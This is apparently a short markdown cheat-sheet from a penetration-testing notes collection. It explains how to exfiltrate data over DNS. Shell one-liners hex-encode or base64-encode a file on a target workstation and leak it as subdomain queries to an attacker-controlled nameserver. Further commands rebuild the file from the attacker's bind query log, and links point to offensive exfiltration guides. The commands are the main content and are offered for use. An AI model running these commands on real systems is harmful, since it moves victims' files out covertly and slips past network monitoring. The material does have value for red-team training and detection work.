# Client

## 01 - Hex Encoded DNS Exfiltration

TODO: Provide a step process for exfiltrating DNS server on the attacker machine

Install for Debian-based distros

```
$ sudo apt install ldnsutils dnsutils
```

Install for Arch-based distros

```
$ sudo pacman -S bind
```

On the target workstation

```
$ xxd -p file.txt > file.hex

$ while read line; do drill $line.<nameserver_dns_server>; done < file.hex

$ grep -Eo [0-9a-f]*.<nameserver_dns_server_IP> /var/lib/bind/query.log | cut -d "." -f 1 | uniq > file.hex

$ xxd -r -p file.hex > file.txt
```

## 02 - Base64 Encoded DNS Exfiltration

```
$ base64 file.txt | td -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed 's/$/<domain.com>/'
```

---
## References

### Command Line Kung Fu

- [Command Line Kung Fu: Exfiltration Nation](http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html)

- [Staged Payloads from Kali Linux | PT Phone Home â€“ DNS](https://www.offsec.com/offsec/staged-payloads-from-kalki-linux-pt-phone-hone-dns/)

- [Downloading Files Through Recursive DNS With Bash (Or PowerShell)](http://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html)

- [NotSoSecure: Out of Band Exploitation (OOB) CheatSheet](https://notsosecure.com/out-band-exploitation-oob-cheatsheet)

- [DNS exfiltration of data: step-by-step simple guide](https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/)

- [Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)](https://john-woodman.com/research/dns-exfiltration-setup/)

- [Deploy Self hosted interactsh-server for Blind & Out of Band Testing](https://takshilp.medium.com/oob-blind-testing-using-dns-exfiltration-54bcc004a0fb)

- [Data-Bouncing - The art of indirect exfiltration.](https://thecontractor.io/data-bouncing/)

### APNIC

- [APNIC: How to Detect and Prevent Common Data Exfiltration Attacks](https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/)